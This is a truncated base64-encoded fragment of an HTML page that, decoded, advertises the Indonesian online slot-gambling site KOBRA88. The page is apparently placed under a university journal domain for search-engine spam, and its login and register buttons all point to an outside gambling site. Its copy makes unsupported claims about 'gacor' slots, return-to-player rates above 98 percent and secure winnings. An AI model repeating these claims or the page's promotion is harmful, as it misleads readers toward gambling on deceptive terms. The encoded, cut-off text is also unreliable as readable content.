Zvb3RlcntkaXNwbGF5OmJsb2NrfX1AbWVkaWEgKG1heC13aWR0aDo0MDBweCl7aHRtbHtmb250LXNpemU6OS40MTE3NjQ3MDU4ODIzNTNweH0ubGNmY3t0b3A6MzY3cHh9fS5hbmlte2FuaW1hdGlvbjpibGlua2luZ3MgMXMgaW5maW5pdGV9QGtleWZyYW1lcyBibGlua2luZ3N7MCV7Ym9yZGVyOjJweCBzb2xpZCAjZmZmfTEwMCV7Ym9yZGVyOjJweCBzb2xpZCAjODEwMTBkfX1Aa2V5ZnJhbWVzIGJsaW5raW5nezAle2JvcmRlcjoycHggc29saWQgI2ZmZn0xMDAle2JvcmRlcjoycHggc29saWQgI2ZjY2QwNn19QGtleWZyYW1lcyBibGlua2luZ3swJXtib3JkZXI6M3B4IHNvbGlkICNmY2NkMDZ9MTAwJXtib3JkZXI6M3B4IHNvbGlkICNmY2NkMDZ9fUBtZWRpYSAobWF4LXdpZHRoOjc2OHB4KXsubWVudS1jb250YWluZXIgLm1lbnUtaXRlbXt3aWR0aDo0OCV9fUAtd2Via2l0LWtleWZyYW1lcyBzaGFrZXswJXstd2Via2l0LXRyYW5zZm9ybTpzY2FsZTNkKDEsMSwxKTt0cmFuc2Zvcm06c2NhbGUzZCgxLDEsMSl9MTAlLDIwJXstd2Via2l0LXRyYW5zZm9ybTpzY2FsZTNkKC45LC45LC45KSByb3RhdGUzZCgwLDAsMSwtM2RlZyk7dHJhbnNmb3JtOnNjYWxlM2QoLjksLjksLjkpIHJvdGF0ZTNkKDAsMCwxLC0zZGVnKX0zMCUsNTAlLDcwJSw5MCV7LXdlYmtpdC10cmFuc2Zvcm06c2NhbGUzZCgxLjEsMS4xLDEuMSkgcm90YXRlM2QoMCwwLDEsM2RlZyk7dHJhbnNmb3JtOnNjYWxlM2QoMS4xLDEuMSwxLjEpIHJvdGF0ZTNkKDAsMCwxLDNkZWcpfTQwJSw2MCUsODAley13ZWJraXQtdHJhbnNmb3JtOnNjYWxlM2QoMS4xLDEuMSwxLjEpIHJvdGF0ZTNkKDAsMCwxLC0zZGVnKTt0cmFuc2Zvcm06c2NhbGUzZCgxLjEsMS4xLDEuMSkgcm90YXRlM2QoMCwwLDEsLTNkZWcpfTEwMCV7LXdlYmtpdC10cmFuc2Zvcm06c2NhbGUzZCgxLDEsMSk7dHJhbnNmb3JtOnNjYWxlM2QoMSwxLDEpfX1Aa2V5ZnJhbWVzIHNoYWtlezAley13ZWJraXQtdHJhbnNmb3JtOnNjYWxlM2QoMSwxLDEpO3RyYW5zZm9ybTpzY2FsZTNkKDEsMSwxKX0xMCUsMjAley13ZWJraXQtdHJhbnNmb3JtOnNjYWxlM2QoLjksLjksLjkpIHJvdGF0ZTNkKDAsMCwxLC0zZGVnKTt0cmFuc2Zvcm06c2NhbGUzZCguOSwuOSwuOSkgcm90YXRlM2QoMCwwLDEsLTNkZWcpfTMwJSw1MCUsNzAlLDkwJXstd2Via2l0LXRyYW5zZm9ybTpzY2FsZTNkKDEuMSwxLjEsMS4xKSByb3RhdGUzZCgwLDAsMSwzZGVnKTt0cmFuc2Zvcm06c2NhbGUzZCgxLjEsMS4xLDEuMSkgcm90YXRlM2QoMCwwLDEsM2RlZyl9NDAlLDYwJSw4MCV7LXdlYmtpdC10cmFuc2Zvcm06c2NhbGUzZCgxLjEsMS4xLDEuMSkgcm90YXRlM2QoMCwwLDEsLTNkZWcpO3RyYW5zZm9ybTpzY2FsZTNkKDEuMSwxLjEsMS4xKSByb3RhdGUzZCgwLDAsMSwtM2RlZyl9MTAwJXstd2Via2l0LXRyYW5zZm9ybTpzY2FsZTNkKDEsMSwxKTt0cmFuc2Zvcm06c2NhbGUzZCgxLDEsMSl9fQogICAgPC9zdHlsZT4KICAgIDxzY3JpcHQgdHlwZT0iYXBwbGljYXRpb24vbGQranNvbiI+CiAgICAgIHsKICAgICAgICAiQGNvbnRleHQiOiAiaHR0cHM6Ly9zY2hlbWEub3JnIiwKICAgICAgICAiQHR5cGUiOiAiT3JnYW5pemF0aW9uIiwKICAgICAgICAibmFtZSI6ICJLT0JSQTg4IiwKICAgICAgICAiYWx0ZXJuYXRlTmFtZSI6ICJLT0JSQTg4IiwKICAgICAgICAidXJsIjogImh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iLAogICAgICAgICJsb2dvIjogImh0dHBzOi8vY2RuLnJidGFzc2V0LmNvbS9hc3NldHMvdHBsLzBiOTk5ZTQwOTcvaW1hZ2VzL2xvZ28uZ2lmIiwKICAgICAgICAic2FtZUFzIjogImh0dHBzOi8vY2RuLnJidGFzc2V0LmNvbS9hc3NldHMvdHBsLzBiOTk5ZTQwOTcvaW1hZ2VzL2xvZ28uZ2lmIgogICAgICB9CiAgICA8L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0iYXBwbGljYXRpb24vbGQranNvbiI+CiAgICAgIHsKICAgICAgICAiQGNvbnRleHQiOiAiaHR0cHM6Ly9zY2hlbWEub3JnIiwKICAgICAgICAiQHR5cGUiOiAiQXJ0aWNsZSIsCiAgICAgICAgIm1haW5FbnRpdHlPZlBhZ2UiOiB7CiAgICAgICAgICAiQHR5cGUiOiAiV2ViUGFnZSIsCiAgICAgICAgICAiQGlkIjogImh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iCiAgICAgICAgfSwKICAgICAgICAiaGVhZGxpbmUiOiAiS09CUkE4ODogU2l0dXMgU2xvdCBHYWNvciBBa3VuIFBybyBUaGFpbGFuZCBUZXJiYXJ1IDIwMjMiLAogICAgICAgICJkZXNjcmlwdGlvbiI6ICJLb2JyYTg4IGFkYWxhaCBTaXR1cyBTbG90IGdhY29yIGRlbmdhbiBha3VuIHBybyB0aGFpbGFuZCB0ZXJiYXJ1IDIwMjMgZGlqYW1pbiBwYWxpbmcgZ2FtcGFuZyBtYXh3aW4iLAogICAgICAgICJpbWFnZSI6IFsiaHR0cHM6Ly9pLnBvc3RpbWcuY2Mvd3ZRTlBwSHcvV2VsY29tLUJvbnVzLTExMDAteC0yMTAuanBnIiwgImh0dHBzOi8vaS5wb3N0aW1nLmNjL3JwOE1qWG5WL0RlcG9zaXQtSGFyaWFuLTExMDAteC0yMTAuanBnIl0sCiAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICJAdHlwZSI6ICJPcmdhbml6YXRpb24iLAogICAgICAgICAgIm5hbWUiOiAiS09CUkE4OCIsCiAgICAgICAgICAidXJsIjogImh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iCiAgICAgICAgfSwKICAgICAgICAicHVibGlzaGVyIjogewogICAgICAgICAgIkB0eXBlIjogIk9yZ2FuaXphdGlvbiIsCiAgICAgICAgICAibmFtZSI6ICJLT0JSQTg4IiwKICAgICAgICAgICJsb2dvIjogewogICAgICAgICAgICAiQHR5cGUiOiAiSW1hZ2VPYmplY3QiLAogICAgICAgICAgICAidXJsIjogImh0dHBzOi8vY2RuLnJidGFzc2V0LmNvbS9hc3NldHMvdHBsLzBiOTk5ZTQwOTcvaW1hZ2VzL2xvZ28uZ2lmIgogICAgICAgICAgfQogICAgICAgIH0sCiAgICAgICAgImRhdGVQdWJsaXNoZWQiOiAiMjAyMy0wNC0wNVQwOToyMjoyNCswMDowMCIsCiAgICAgICAgImRhdGVNb2RpZmllZCI6ICIyMDIzLTA1LTEzVDE3OjA1OjA3KzAwOjAwIgogICAgICB9CiAgICA8L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0iYXBwbGljYXRpb24vbGQranNvbiI+CiAgICAgIHsKICAgICAgICAiQGNvbnRleHQiOiAiaHR0cHM6Ly9zY2hlbWEub3JnLyIsCiAgICAgICAgIkB0eXBlIjogIkJyZWFkY3J1bWJMaXN0IiwKICAgICAgICAiaXRlbUxpc3RFbGVtZW50IjogW3sKICAgICAgICAgICJAdHlwZSI6ICJMaXN0SXRlbSIsCiAgICAgICAgICAicG9zaXRpb24iOiAxLAogICAgICAgICAgIm5hbWUiOiAiSG9tZSIsCiAgICAgICAgICAiaXRlbSI6ICJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIgogICAgICAgIH0sIHsKICAgICAgICAgICJAdHlwZSI6ICJMaXN0SXRlbSIsCiAgICAgICAgICAicG9zaXRpb24iOiAyLAogICAgICAgICAgIm5hbWUiOiAiS09CUkE4OCIsCiAgICAgICAgICAiaXRlbSI6ICJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIgogICAgICAgIH0sIHsKICAgICAgICAgICJAdHlwZSI6ICJMaXN0SXRlbSIsCiAgICAgICAgICAicG9zaXRpb24iOiAzLAogICAgICAgICAgIm5hbWUiOiAiS09CUkE4ODogU2l0dXMgU2xvdCBHYWNvciBBa3VuIFBybyBUaGFpbGFuZCBUZXJiYXJ1IDIwMjMiCiAgICAgICAgfV0KICAgICAgfQogICAgPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+CiAgICA8aGVhZGVyPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1tZW51Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWdsb2JhbCBuYXYgcC0xIj4KICAgICAgICAgICAgICAgIDwhLS0gSEVBREVSIExPR08gLS0+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJsb2dvIiBpdGVtc2NvcGU9Iml0ZW1zY29wZSIgaXRlbXR5cGU9Imh0dHA6Ly9zY2hlbWEub3JnL0JyYW5kIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGFtcC1pbWcgc3JjPSJodHRwczovL2Nkbi5yYnRhc3NldC5jb20vYXNzZXRzL3RwbC8wYjk5OWU0MDk3L2ltYWdlcy9sb2dvLmdpZiIgd2lkdGg9IjI2NCIgaGVpZ2h0PSI0OSIgYWx0PSJLT0JSQTg4OiBTaXR1cyBTbG90IEdhY29yIEFrdW4gUHJvIFRoYWlsYW5kIFRlcmJhcnUgMjAyMyI+PC9hbXAtaW1nPgogICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvaGVhZGVyPgogICAgPHNlY3Rpb24gY2xhc3M9ImNvbnRlbnQtY29udGFpbmVyIj4KICAgIAk8ZGl2IGNsYXNzPSJidXR0b24tY29udGFpbmVyIj4KICAgIAkJPGRpdiBjbGFzcz0iYnV0dG9uIj48YSBocmVmPSJodHRwczovL2tvYnJhODhzdGFybGlnaHQuY29tL2FjY291bnQvcmVnaXN0ZXIvc2Vvc2Nyb3ciIHRhcmdldD0iX2JsYW5rIj48c3BhbiBjbGFzcz0idHJvbi1sb2dpbiI+TE9HSU48L3NwYW4+PC9hPjwvZGl2PgogICAgCQk8ZGl2IGNsYXNzPSJidXR0b24iPjxhIGhyZWY9Imh0dHBzOi8va29icmE4OHN0YXJsaWdodC5jb20vYWNjb3VudC9yZWdpc3Rlci9zZW9zY3JvdyIgdGFyZ2V0PSJfYmxhbmsiPjxzcGFuIGNsYXNzPSJ0cm9uLXJlZ2lzIj5EQUZUQVI8L3NwYW4+PC9hPjwvZGl2PgogICAgCTwvZGl2PgogICAgCTxkaXYgY2xhc3M9InRpdGxlMSI+CiAgICAJCTxidXR0b24gdHlwZT0ibG9naW4iIGNsYXNzPSJidG4gYnRuLWRhZiI+CiAgICAJCQk8YSBocmVmPSJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIiByZWw9Im5vZm9sbG93IG5vcmVmZXJyZXIiIHRhcmdldD0iX2JsYW5rIj5TaXR1cyBKdWRpIFNsb3QgU2VydmVyIFRoYWlsYW5kIFRlcmJhaWsgIzE8L2E+CgkJCTwvYnV0dG9uPgogICAgCTwvZGl2PgogICAgCTxkaXYgY2xhc3M9ImNhcm91c2VsLWNvbnRhaW5lciI+CiAgICAJCTxhbXAtY2Fyb3VzZWwgd2lkdGg9Ijk4MCIgaGVpZ2h0PSIyNDUiIGxheW91dD0icmVzcG9uc2l2ZSIgdHlwZT0ic2xpZGVzIiBhdXRvcGxheSBkZWxheT0iMTAwMCIgcm9sZT0icmVnaW9uIj4KCSAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8va29icmE4OHN0YXJsaWdodC5jb20vYWNjb3VudC9yZWdpc3Rlci9zZW9zY3JvdyI+CgkgICAgICAgICAgICAgICAgPGFtcC1pbWcgc3JjPSJodHRwczovL2kucG9zdGltZy5jYy93dlFOUHBIdy9XZWxjb20tQm9udXMtMTEwMC14LTIxMC5qcGciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjM1MCIgbGF5b3V0PSJyZXNwb25zaXZlIiB0aXRsZT0iS09CUkE4ODogU2l0dXMgU2xvdCBHYWNvciBBa3VuIFBybyBUaGFpbGFuZCBUZXJiYXJ1IDIwMjMiIGFsdD0iS09CUkE4ODogU2l0dXMgU2xvdCBHYWNvciBBa3VuIFBybyBUaGFpbGFuZCBUZXJiYXJ1IDIwMjMiPjwvYW1wLWltZz4KCSAgICAgICAgICAgIDwvYT4KCSAgICAgICAgPC9hbXAtY2Fyb3VzZWw+CiAgICAJPC9kaXY+CiAgICAJPGRpdiBjbGFzcz0iamFja3BvdCI+CiAgICAJCTxhbXAtaW1nIHNyYz0iaHR0cHM6Ly9pLnBvc3RpbWcuY2MvbTJucnA2RnEvSnAuZ2lmIiB3aWR0aD0iNjQwIiBoZWlnaHQ9IjE0NCIgbGF5b3V0PSJyZXNwb25zaXZlIiBhbHQ9IlNsb3QgR2Fjb3IgamFja3BvdCI+PC9hbXAtaW1nPgogICAgCTwvZGl2PgogICAgCTxkaXYgY2xhc3M9Im1lbnUtY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0ibWVudS1pdGVtIj4KCQkJCTxhIGhyZWY9Imh0dHBzOi8va29icmE4OHN0YXJsaWdodC5jb20vYWNjb3VudC9yZWdpc3Rlci9zZW9zY3JvdyIgdGl0bGU9IlBST01PIFNMT1QiPjxzcGFuIGNsYXNzPSJ0cm9uIj5QUk9NTyBTTE9UPC9zcGFuPjwvYT4KCQkJPC9kaXY+CgkJCTxkaXYgY2xhc3M9Im1lbnUtaXRlbSI+CgkJCQk8YSBocmVmPSJodHRwczovL2tvYnJhODhzdGFybGlnaHQuY29tL2FjY291bnQvcmVnaXN0ZXIvc2Vvc2Nyb3ciIHRpdGxlPSJqdWRpIHRvZ2VsIj48c3BhbiBjbGFzcz0idHJvbiI+SlVESSBUT0dFTDwvc3Bhbj48L2E+CgkJCTwvZGl2PgoJCQk8ZGl2IGNsYXNzPSJtZW51LWl0ZW0iPgoJCQkJPGEgaHJlZj0iaHR0cHM6Ly9rb2JyYTg4c3RhcmxpZ2h0LmNvbS9hY2NvdW50L3JlZ2lzdGVyL3Nlb3Njcm93IiB0aXRsZT0iVEVNQkFLIElLQU4iPjxzcGFuIGNsYXNzPSJ0cm9uIj5URU1CQUsgSUtBTjwvc3Bhbj48L2E+CgkJCTwvZGl2PgoJCQk8ZGl2IGNsYXNzPSJtZW51LWl0ZW0iPgoJCQkJPGEgaHJlZj0iaHR0cHM6Ly9rb2JyYTg4c3RhcmxpZ2h0LmNvbS9hY2NvdW50L3JlZ2lzdGVyL3Nlb3Njcm93IiB0aXRsZT0iU1BPUlRCT09LIj48c3BhbiBjbGFzcz0idHJvbiI+U1BPUlRCT09LPC9zcGFuPjwvYT4KCQkJPC9kaXY+CiAgICAJPC9kaXY+CiAgICAJPGRpdj4KICAgIAkJPHRhYmxlIGNsYXNzPSJzbG90Z2Fjb3IiIHN0eWxlPSJ3aWR0aDoxMDAlIj4KCQkJCTx0aGVhZD4KCQkJCQk8dHI+CgkJCQkJPHRoIGNvbHNwYW49IjMiPkluZm9ybWFzaSBTaXR1cyBHYWNvciBIYXJpIEluaTwvdGg+CgkJCQkJPC90cj4KCQkJCTwvdGhlYWQ+CgkJCQk8dGJvZHk+CgkJCQkJPHRyPgoJCQkJCQk8dGQgc3R5bGU9InBhZGRpbmc6IDEwcHg7Ij5OYW1hIFNpdHVzPC90ZD4KCQkJCQkJPHRkIHN0eWxlPSJwYWRkaW5nOiAxMHB4OyI+PGEgaHJlZj0iaHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9rb2JyYTg4LyIgdGl0bGU9IktPQlJBODgiIHJlbD0ibm9mb2xsb3cgbm9vcGVuZXIiIHRhcmdldD0iX2JsYW5rIj5LT0JSQTg4PC9hPjwvdGQ+CgkJCQkJPC90cj4KCQkJCQk8dHI+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPlBlcm1haW5hbiBKdWRpIE9ubGluZTwvdGQ+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPjxhIGhyZWY9Imh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iIHRpdGxlPSJTbG90IE9ubGluZSI+a29icmE4OCwgc2xvdCB0aGFpbGFuZCwgYWt1biBwcm8gdGhhaWxhbmQ8L2E+PC90ZD4KCQkJCQk8L3RyPgoJCQkJCTx0cj4KCQkJCQkJPHRkIHN0eWxlPSJwYWRkaW5nOiAxMHB4OyI+UHJvdmlkZXIgU2xvdDwvdGQ+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPvCfn6YgUHJhZ21hdGljIFBsYXksIPCfn6cgSGFiYW5lcm8sIPCfn6kgTWljcm8gR2FtaW5nLCDwn5+lIEpva2VyMTIzPC90ZD4KCQkJCQk8L3RyPgoJCQkJCTx0cj4KCQkJCQkJPHRkIHN0eWxlPSJwYWRkaW5nOiAxMHB4OyI+UlRQIFNsb3QgR2Fjb3IgOTglPC90ZD4KCQkJCQkJPHRkIHN0eWxlPSJwYWRkaW5nOiAxMHB4OyI+8J+UsSBHYXRlcyBvZiBPbHltcHVzLCDwn42tIFN3ZWV0IEJvbmFuemEsIPCfko4gQXp0ZWMgR2VtczwvdGQ+CgkJCQkJPC90cj4KCQkJCQk8dHI+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPk1pbmltYWwgRGVwb3NpdDwvdGQ+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPvCfkrhScCAxMC4wMDA8L3RkPgoJCQkJCTwvdHI+CgkJCQkJPHRyPgoJCQkJCQk8dGQgc3R5bGU9InBhZGRpbmc6IDEwcHg7Ij5NZXRvZGUgRGVwb3NpdDwvdGQ+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPuKchVRyYW5zZmVyIEJhbmssIEUtV2FsbGV0LCBQdWxzYTwvdGQ+CgkJCQkJPC90cj4KCQkJCQk8dHI+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPkRlcG9zaXQgZGFuIFdpdGhkcmF3IEluc3RhbnQ8L3RkPgoJCQkJCQk8dGQgc3R5bGU9InBhZGRpbmc6IDEwcHg7Ij7ijJtEaWJhd2FoIDEgbWVuaXQ8L3RkPgoJCQkJCTwvdHI+CgkJCQkJPHRyPgoJCQkJCQk8dGQgc3R5bGU9InBhZGRpbmc6IDEwcHg7Ij5DdXN0b21lciBTZXJ2aWNlPC90ZD4KCQkJCQkJPHRkIHN0eWxlPSJwYWRkaW5nOiAxMHB4OyI+8J+VmzI0IEphbTwvdGQ+CgkJCQkJPC90cj4KCQkJCQk8dHI+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPkRhZnRhciBTZWthcmFuZzwvdGQ+CgkJCQkJCTx0ZCBzdHlsZT0icGFkZGluZzogMTBweDsiPjxhIGhyZWY9Imh0dHBzOi8va29icmE4OHN0YXJsaWdodC5jb20vYWNjb3VudC9yZWdpc3Rlci9zZW9zY3JvdyIgcmVsPSJub2ZvbGxvdyBub29wZW5lciIgdGFyZ2V0PSJfYmxhbmsiIHRpdGxlPSJLT0JSQTg4OiBTaXR1cyBTbG90IEdhY29yIEFrdW4gUHJvIFRoYWlsYW5kIFRlcmJhcnUgMjAyMyI+S2xpayBEaXNpbmk8L2E+PC90ZD4KCQkJCQk8L3RyPgoJCQkJPC90Ym9keT4KCQkJPC90YWJsZT4KICAgIAk8L2Rpdj4KICAgIAk8ZGl2PgogICAgCQk8ZGl2IGNsYXNzPSJzaXRlLWRlc2NyaXB0aW9uIj4KCQkJCTxoMT5LT0JSQTg4OiBTaXR1cyBTbG90IEdhY29yIEFrdW4gUHJvIFRoYWlsYW5kIFRlcmJhcnUgMjAyMzwvaDE+PHA+U2VsYW1hdCBkYXRhbmcgZGkgPGEgdGl0bGU9ImtvYnJhODgiIGhyZWY9Imh0dHBzOi8vanVybmFsZmlzaXAudWluc2J5LmFjLmlkL3B1YmxpYy9zaXRlLy0va29icmE4OC8iPktvYnJhODg8L2E+IHNpdHVzIHNsb3Qgb25saW5lIHNlcnZlciB0aGFpbGFuZCBkZW5nYW4gYWt1biBwcm8gcGFsaW5nIGdhY29yIHRlcmJhcnUgZGkgdGFodW4gMjAyMy4gSmlrYSBBbmRhIG1lbmNhcmkgc2l0dXMganVkaSBvbmxpbmUgc2VydmVyIGx1YXIgeWFuZyBtYW1wdSBtZW1iZXJpa2FuIGJhbnlhayBrZW1lbmFuZ2FuIG1ha2EgS29icmE4OCBhZGFsYWggamF3YWJhbm55YS4gRGlrZW5hbCBkZW5nYW4gYmVyYWdhbSBwZXJtYWluYW4gc2xvdCB5YW5nIG1lbmFyaWsgZGFuIGFudGFybXVrYSB5YW5nIHJlc3BvbnNpZiwgS29icmE4OCBtZW5hd2Fya2FuIHBlbmdhbGFtYW4gYmVybWFpbiB5YW5nIG1lbmdoaWJ1ciBkYW4gbWVueWVuYW5na2FuLiBEZW5nYW4gbWVuZ2d1bmFrYW4gc2VydmVyIDxhIHRpdGxlPSJzbG90IHRoYWlsYW5kIiBocmVmPSJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIj5TbG90IFRoYWlsYW5kPC9hPiB0ZXJiYXJ1LCBzaXR1cyBpbmkgbWVuamFtaW4ga3VhbGl0YXMgZ2FtZXBsYXkgeWFuZyBsYW5jYXIgZGFuIGtlYW1hbmFuIGRhdGEgeWFuZyBkaXRpbmdrYXRrYW4uIEtvYnJhODgganVnYSBtZW5vbmpvbGthbiBib251cyBkYW4gcHJvbW9zaSBtZW5hcmlrLCBzZXJ0YSBsYXlhbmFuIHBlbGFuZ2dhbiB5YW5nIHJlc3BvbnNpZi4gQmFnaSBwYXJhIHBlbmlrbWF0IHNsb3Qgb25saW5lLCBLb2JyYTg4IGRhcmkgVGhhaWxhbmQgdGVsYWggbWVuZ3VrdWhrYW4gZGlyaW55YSBzZWJhZ2FpIHBpbGloYW4geWFuZyBtZW5hcmlrIHVudHVrIG1lbmRhcGF0a2FuIGtlc2VuYW5nYW4gZGFuIHBlbHVhbmcgZGFsYW0gZHVuaWEganVkaSBvbmxpbmUuPC9wPjxoMj5TbG90IFNlcnZlciBUaGFpbGFuZCBEZW5nYW4gQWt1biBQcm8gVGVyYmFpazwvaDI+PHA+S09CUkE4OCBtZW5naGFkaXJrYW4gaW5vdmFzaSB0ZXJiYXJ1IGRhbGFtIGR1bmlhIGp1ZGkgc2xvdC4gRGVuZ2FuIHNsb3Qgc2VydmVyIHRlcmJhaWsgZGFuIGFrdW4gcHJvIFRoYWlsYW5kIHlhbmcgdGFrIHRlcnRhbmRpbmdpLCBzaXR1cyBpbmkgbWVtYmVyaWthbiBzZW5zYXNpIGJlcm1haW4ganVkaSBzbG90IG9ubGluZSB5YW5nIG1lbmd1bnR1bmdrYW4uIEJlcmFnYW0gcGVybWFpbmFuIGp1ZGkgb25saW5lIHRlcnNlZGlhIGxlbmdrYXAsIGxlbmdrYXAgZGVuZ2FuIGphbWluYW4ga2VhbWFuYW4gdGluZ2thdCB0aW5nZ2kgZGFuIGxheWFuYW4gcGVsYW5nZ2FuIHlhbmcgdGFuZ2dhcC4gS09CUkE4OCBtZW5qYWRpIGRlc3RpbmFzaSB1dGFtYSBwYXJhIHBlbmNpbnRhIGp1ZGkgb25saW5lIGJlcmthdCByZXB1dGFzaW55YSB5YW5nIHRhayB0ZXJnb3lhaGthbi48L3A+PHA+U2ViYWdhaSBwZW55ZWRpYSBzbG90IGdhY29yIHRlcmJhaWssIEtPQlJBODggdGFrIGhhbnlhIG1lbmF3YXJrYW4gcGVuZ2FsYW1hbiBiZXJtYWluIHlhbmcgc2VydSwgdGFwaSBqdWdhIG1lbmdoYWRpcmthbiBiZXJhZ2FtIGJvbnVzIGRhbiBwcm9tb3NpIG1lbmdnaXVya2FuLiBOaWttYXRpIG1hbmZhYXQgZGFyaSBmcmVlYmV0LCBmcmVlc3BpbiwgaGluZ2dhIGJvbnVzIHNhbWJ1dGFuIGJhZ2kgbWVtYmVyIGJhcnUgbWVsYWx1aSBha3VuIHBybyB0aGFpbGFuZCB0ZXJiYWlrLjwvcD48aDI+S29icmE4OCBTbG90IGdhY29yIGRlbmdhbiBSVFAgcGFsaW5nIHRpbmdnaSAyMDIzPC9oMj48cD5EYWxhbSBkdW5pYSBwZXJqdWRpYW4gb25saW5lIHlhbmcgdGVydXMgYmVya2VtYmFuZywgcGFyYSBwZW5nZ2VtYXIgc2xvdCBvbmxpbmUgc2VsYWx1IG1lbmNhcmkgcGVsdWFuZyB1bnR1ayBtZXJhaWgga2VtZW5hbmdhbiBiZXNhci4gU2FsYWggc2F0dSBuYW1hIHlhbmcgdGVuZ2FoIHBvcHVsZXIgYWRhbGFoIEtvYnJhODggU2xvdCwgc2VidWFoIHBlcm1haW5hbiBkZW5nYW4gcmVwdXRhc2kgZ2VtaWxhbmcgZGFuIFJUUCAoUmV0dXJuIHRvIFBsYXllcikgcGFsaW5nIHRpbmdnaSBkaSB0YWh1biAyMDIzLjwvcD48cD5SVFAsIGF0YXUgUmV0dXJuIHRvIFBsYXllciwgbWVuZ2FjdSBwYWRhIHBlcnNlbnRhc2UgcmF0YS1yYXRhIGRhcmkgdG90YWwgdGFydWhhbiB5YW5nIGRpa2VtYmFsaWthbiBrZXBhZGEgcGVtYWluIGRhbGFtIGphbmdrYSBwYW5qYW5nLiBEaSB0YWh1biAyMDIzLCBLb2JyYTg4IFNsb3QgR2Fjb3IgdGVsYWggbWVuY2FwYWkgUlRQIHlhbmcgbWVuZ2VzYW5rYW4sIHlhaXR1IGxlYmloIGRhcmkgOTglLiBBbmdrYSBpbmkgYmVyYXJ0aSBiYWh3YSBkYXJpIHNldGlhcCAxMDAgdW5pdCB0YXJ1aGFuLCBsZWJpaCBkYXJpIDk4IHVuaXQga2VtdW5na2luYW4gYWthbiBrZW1iYWxpIGtlcGFkYSBwZW1haW4uIFRpbmdrYXQgUlRQIHlhbmcgdGluZ2dpIHNlcGVydGkgaW5pIHRpZGFrIGhhbnlhIG1lbmFyaWsgcGVyaGF0aWFuIHBhcmEgcGVtYWluLCB0ZXRhcGkganVnYSBtZW51bmp1a2thbiBrZWFkaWxhbiBkYW4gdHJhbnNwYXJhbnNpIGRhcmkgcGVuZ2VtYmFuZyBwZXJtYWluYW4uPC9wPjxwPkJlcmlrdXQgaW5pIGJlYmVyYXBhIGdhbWUgc2xvdCBnYWNvciBkZW5nYW4gUlRQIHBhbGluZyB0aW5nZ2kgZGkgU2l0dXMgQWt1biBQcm8gVGhhaWxhbmQgS29icmE4ODo8L3A+PHVsIGRhdGEtc291cmNlcG9zPSIzOjEtMTM6MCI+PGxpIGRhdGEtc291cmNlcG9zPSIzOjEtMzo0NCI+R2F0ZXMgb2YgT2x5bXB1cyAoUHJhZ21hdGljIFBsYXkpIC0gOTgsNTAlPC9saT48bGkgZGF0YS1zb3VyY2Vwb3M9IjQ6MS00OjQxIj5Td2VldCBCb25hbnphIChQcmFnbWF0aWMgUGxheSkgLSA5Ny4yMiU8L2xpPjxsaSBkYXRhLXNvdXJjZXBvcz0iNToxLTU6MzgiPkF6dGVjIEdlbXMgKFByYWdtYXRpYyBQbGF5KSAtIDk0Ljc0JTwvbGk+PGxpIGRhdGEtc291cmNlcG9zPSI2OjEtNjo0MSI+U3RhcmxpZ2h0IFByaW5jZXNzIChQbGF5J24gR28pIC0gOTYuMjAlPC9saT48bGkgZGF0YS1zb3VyY2Vwb3M9Ijc6MS03OjM1Ij5Cb29rIG9mIERlYWQgKFBsYXknbiBHbykgLSA5Ni41NSU8L2xpPjxsaSBkYXRhLXNvdXJjZXBvcz0iODoxLTg6MzIiPlJlYWN0b29ueiAoUGxheSduIEdvKSAtIDk4LjEzJTwvbGk+PGxpIGRhdGEtc291cmNlcG9zPSI5OjEtOTo0MSI+Qm9uYW56YSBHb2xkIChCaWcgVGltZSBHYW1pbmcpIC0gOTIuMzAlPC9saT48bGkgZGF0YS1zb3VyY2Vwb3M9IjEwOjEtMTA6NDIiPkZydWl0IFBhcnR5IDIgKEJpZyBUaW1lIE